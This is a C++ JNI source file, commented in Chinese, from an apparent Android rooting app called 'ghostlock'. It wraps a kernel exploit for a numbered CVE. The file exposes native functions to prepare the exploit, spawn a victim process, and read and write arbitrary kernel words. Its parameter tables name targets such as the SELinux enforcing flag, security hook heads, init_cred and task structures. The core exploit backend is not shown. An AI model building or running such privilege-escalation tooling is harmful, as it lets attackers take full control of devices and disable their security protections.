/** @file jni/native_43499.cpp
 *  libghostlock43499.so：43499 的 JNI 函数面（用户裁定 2026-10-14）。
 *
 *  这个库只做三件事：把 Java 的类型化参数翻成 C++ 的值、调 [Backend43499] 的具名函数、把结果按
 *  调用方给的数组写回去。没有 op 名、没有 token、没有一帧字节：每个函数都是普通函数，参数是
 *  数字/布尔/数组，返回值是调用码，失败原因由 refusal(handle) 取。
 *
 *  数组布局是自描述的：initializeFields()/snapshotFields() 把"第几个是什么"用字符串表导出来，
 *  Kotlin 单测按它对拍，于是两端不可能各写一份顺序。
 */
#include <cstdint>

#include "jni/api_43499.hpp"
#include "jni/wrapper_support.hpp"

namespace {
    using ghostlock::jni::Backend43499;
    using ghostlock::jni::CallCode;
    using ghostlock::jni::refuse;
    using ghostlock::jni::Refusal;
    using ghostlock::jni::wrapper::read_longs;
    using ghostlock::jni::wrapper::write_longs;

    /** 这个库的会话表。一个进程一份。 */
    ghostlock::jni::wrapper::Registry<Backend43499> &registry() noexcept {
        static ghostlock::jni::wrapper::Registry<Backend43499> table;
        return table;
    }

    /** 每个句柄最后一条具名拒绝：由 with() 的回调写入。 */
    std::mutex &refusal_mutex() noexcept {
        static std::mutex mutex;
        return mutex;
    }

    /** 把 C++ 的调用码变成 jint（就是它的数值，Kotlin 侧有同名的常量表）。 */
    [[nodiscard]] jint code(const CallCode value) noexcept {
        return static_cast<jint>(value);
    }

    /** 快照结果的数组布局：第几个是什么。顺序即 [snapshot] 写出的顺序。 */
    constexpr const char *const kSnapshotFields[] = {
        "phase", "flags", "width", "page_base", "word0", "word1", "payload_page", "payload_base",
        "alias_delta", "found", "mm_struct", "victim_task", "victim_pid",
    };
    constexpr std::size_t kSnapshotFieldCount = sizeof(kSnapshotFields) / sizeof(kSnapshotFields[0]);

    /** 初始化参数的数组布局：顺序即 [initialize] 读入的顺序。 */
    constexpr const char *const kInitializeFields[] = {
        "route_id", "waiter_off", "buffer_size", "task_offset", "lock_offset",
        "kernelsnitch_collisions", "mm_struct_sz", "compact_waiter", "copy_size", "usage_value",
        "caps_count", "caps_value", "ref0_image", "ref1_image", "ref2_image", "ref3_image",
        "image_selinux_enforcing", "image_security_hook_heads", "image_init_task", "image_init_cred",
    };
    constexpr std::size_t kInitializeFieldCount =
        sizeof(kInitializeFields) / sizeof(kInitializeFields[0]);

    /** 把一次快照写进调用方的数组。 */
    void fill_snapshot(jlong *out, const ghostlock::jni::Snapshot43499 &snapshot) noexcept {
        out[0] = static_cast<jlong>(snapshot.phase);
        out[1] = static_cast<jlong>(snapshot.flags);
        out[2] = static_cast<jlong>(snapshot.width);
        out[3] = static_cast<jlong>(snapshot.facts.page_base);
        out[4] = static_cast<jlong>(snapshot.facts.word0);
        out[5] = static_cast<jlong>(snapshot.facts.word1);
        out[6] = static_cast<jlong>(snapshot.facts.payload_page);
        out[7] = static_cast<jlong>(snapshot.facts.payload_base);
        out[8] = static_cast<jlong>(snapshot.facts.alias_delta);
        out[9] = static_cast<jlong>(snapshot.facts.found);
        out[10] = static_cast<jlong>(snapshot.facts.mm_struct);
        out[11] = static_cast<jlong>(snapshot.facts.victim_task);
        out[12] = static_cast<jlong>(snapshot.facts.victim_pid);
    }
}  // namespace

extern "C" {
/** 建一个会话。@return 句柄（> 0）。 */
JNIEXPORT jlong JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_create(JNIEnv *, jclass) {
    return static_cast<jlong>(registry().create());
}

/** @return 调用码；参数不全时 BadParameters。 */
JNIEXPORT jint JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_initialize(
        JNIEnv *env, jclass, jlong handle, jlongArray params) {
    jlong values[kInitializeFieldCount] = {};
    if (!read_longs(env, params, values, kInitializeFieldCount)) {
        return code(CallCode::BadParameters);
    }
    ghostlock::jni::Initialize43499 parsed{};
    parsed.route_id = static_cast<std::uint64_t>(values[0]);
    parsed.waiter_off = static_cast<std::uint64_t>(values[1]);
    parsed.buffer_size = static_cast<std::uint64_t>(values[2]);
    parsed.task_offset = static_cast<std::uint64_t>(values[3]);
    parsed.lock_offset = static_cast<std::uint64_t>(values[4]);
    parsed.kernelsnitch_collisions = static_cast<std::uint64_t>(values[5]);
    parsed.mm_struct_sz = static_cast<std::uint64_t>(values[6]);
    parsed.compact_waiter = static_cast<std::uint64_t>(values[7]);
    parsed.copy_size = static_cast<std::uint64_t>(values[8]);
    parsed.usage_value = static_cast<std::uint64_t>(values[9]);
    parsed.caps_count = static_cast<std::uint64_t>(values[10]);
    parsed.caps_value = static_cast<std::uint64_t>(values[11]);
    parsed.ref0_image = static_cast<std::uint64_t>(values[12]);
    parsed.ref1_image = static_cast<std::uint64_t>(values[13]);
    parsed.ref2_image = static_cast<std::uint64_t>(values[14]);
    parsed.ref3_image = static_cast<std::uint64_t>(values[15]);
    parsed.image_selinux_enforcing = static_cast<std::uint64_t>(values[16]);
    parsed.image_security_hook_heads = static_cast<std::uint64_t>(values[17]);
    parsed.image_init_task = static_cast<std::uint64_t>(values[18]);
    parsed.image_init_cred = static_cast<std::uint64_t>(values[19]);
    return code(registry().with(handle, [&parsed](Backend43499 &backend) {
        return backend.initialize(parsed);
    }));
}

/** 回答当前状态。@param out 至少 13 个 long（见 snapshotFields()）。 */
JNIEXPORT jint JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_snapshot(
        JNIEnv *env, jclass, jlong handle, jlongArray out) {
    if (out == nullptr || env->GetArrayLength(out) < static_cast<jsize>(kSnapshotFieldCount)) {
        return code(CallCode::BadParameters);
    }
    ghostlock::jni::Snapshot43499 snapshot{};
    const CallCode answer = registry().with(handle, [&snapshot](Backend43499 &backend) {
        return backend.snapshot(snapshot);
    });
    if (answer == CallCode::Ok) {
        jlong values[kSnapshotFieldCount] = {};
        fill_snapshot(values, snapshot);
        if (!write_longs(env, out, values, kSnapshotFieldCount)) {
            return code(CallCode::BadParameters);
        }
    }
    return code(answer);
}

/** 跑准备。@param out 同 snapshot（准备产生的事实随之发布）。 */
JNIEXPORT jint JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_prepare(
        JNIEnv *env, jclass, jlong handle, jlongArray out) {
    ghostlock::jni::Snapshot43499 snapshot{};
    const CallCode answer = registry().with(handle, [&snapshot](Backend43499 &backend) {
        return backend.prepare(snapshot);
    });
    if (answer == CallCode::Ok) {
        jlong values[kSnapshotFieldCount] = {};
        fill_snapshot(values, snapshot);
        if (!write_longs(env, out, values, kSnapshotFieldCount)) {
            return code(CallCode::BadParameters);
        }
    }
    return code(answer);
}

/** 跑搜索。 */
JNIEXPORT jint JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_discover(
        JNIEnv *env, jclass, jlong handle, jlongArray out) {
    ghostlock::jni::Snapshot43499 snapshot{};
    const CallCode answer = registry().with(handle, [&snapshot](Backend43499 &backend) {
        return backend.discover(snapshot);
    });
    if (answer == CallCode::Ok) {
        jlong values[kSnapshotFieldCount] = {};
        fill_snapshot(values, snapshot);
        if (!write_longs(env, out, values, kSnapshotFieldCount)) {
            return code(CallCode::BadParameters);
        }
    }
    return code(answer);
}

/** fork 受害者。 */
JNIEXPORT jint JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_spawnVictim(
        JNIEnv *env, jclass, jlong handle, jlongArray out) {
    ghostlock::jni::Snapshot43499 snapshot{};
    const CallCode answer = registry().with(handle, [&snapshot](Backend43499 &backend) {
        return backend.spawn_victim(snapshot);
    });
    if (answer == CallCode::Ok) {
        jlong values[kSnapshotFieldCount] = {};
        fill_snapshot(values, snapshot);
        if (!write_longs(env, out, values, kSnapshotFieldCount)) {
            return code(CallCode::BadParameters);
        }
    }
    return code(answer);
}

/** 问受害者是什么：kind 0 = uid，1 = comm。@param out 一个 long。 */
JNIEXPORT jint JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_victimProbe(
        JNIEnv *env, jclass, jlong handle, jint kind, jlongArray out) {
    if (out == nullptr || env->GetArrayLength(out) < 1) {
        return code(CallCode::BadParameters);
    }
    std::uint64_t value = 0U;
    const CallCode answer = registry().with(handle, [kind, &value](Backend43499 &backend) {
        return backend.victim_probe(static_cast<std::uint64_t>(kind), value);
    });
    if (answer == CallCode::Ok) {
        const jlong written = static_cast<jlong>(value);
        if (!write_longs(env, out, &written, 1U)) {
            return code(CallCode::BadParameters);
        }
    }
    return code(answer);
}

/** 落一个字。form 见 WriteForm（1 保留清零 / 2 叶子清零 / 3 写值保留）。 */
JNIEXPORT jint JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_writeWord(
        JNIEnv *, jclass, jlong handle, jlong address, jlong value, jint form, jlong offset,
        jboolean value_given) {
    ghostlock::jni::WriteWord43499 request{};
    request.address = static_cast<std::uint64_t>(address);
    request.value = static_cast<std::uint64_t>(value);
    request.form = ghostlock::jni::write_form_of(static_cast<std::uint64_t>(form));
    request.offset = static_cast<std::uint64_t>(offset);
    request.value_given = value_given == JNI_TRUE;
    return code(registry().with(handle, [&request](Backend43499 &backend) {
        return backend.write_word(request);
    }));
}

/** 读一个字。@param out 一个 long。 */
JNIEXPORT jint JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_readWord(
        JNIEnv *env, jclass, jlong handle, jlong address, jlongArray out) {
    if (out == nullptr || env->GetArrayLength(out) < 1) {
        return code(CallCode::BadParameters);
    }
    std::uint64_t value = 0U;
    const CallCode answer = registry().with(handle, [address, &value](Backend43499 &backend) {
        return backend.read_word(static_cast<std::uint64_t>(address), value);
    });
    if (answer == CallCode::Ok) {
        const jlong written = static_cast<jlong>(value);
        if (!write_longs(env, out, &written, 1U)) {
            return code(CallCode::BadParameters);
        }
    }
    return code(answer);
}

/** 关掉这个会话（幂等）。 */
JNIEXPORT jint JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_shutdown(
        JNIEnv *, jclass, jlong handle) {
    return code(registry().with(handle, [](Backend43499 &backend) { return backend.shutdown(); }));
}

/** 回收这个会话（之后句柄作废）。 */
JNIEXPORT jint JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_destroy(
        JNIEnv *, jclass, jlong handle) {
    return registry().retire(static_cast<std::uint64_t>(handle)) ? code(CallCode::Ok)
                                                                : code(CallCode::StaleHandle);
}

/** @return 这个句柄最后一条具名拒绝；句柄无效或没有拒绝时是空串。 */
JNIEXPORT jstring JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_refusal(
        JNIEnv *env, jclass, jlong handle) {
    char text[128] = {};
    registry().with(handle, [&text](Backend43499 &backend) {
        const char *const name = backend.refusal();
        for (std::size_t index = 0U; index + 1U < sizeof(text) && name[index] != '\0'; ++index) {
            text[index] = name[index];
        }
        return CallCode::Ok;
    });
    return env->NewStringUTF(text);
}

/** @return snapshot 的数组布局（第几个是什么）。 */
JNIEXPORT jobjectArray JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_snapshotFields(
        JNIEnv *env, jclass) {
    return ghostlock::jni::wrapper::make_string_array(env, kSnapshotFields, kSnapshotFieldCount);
}

/** @return initialize 的数组布局（第几个是什么）。 */
JNIEXPORT jobjectArray JNICALL Java_com_ghostlock_app_jni_cve43499_Native43499_initializeFields(
        JNIEnv *env, jclass) {
    return ghostlock::jni::wrapper::make_string_array(env, kInitializeFields, kInitializeFieldCount);
}
}  // extern "C"
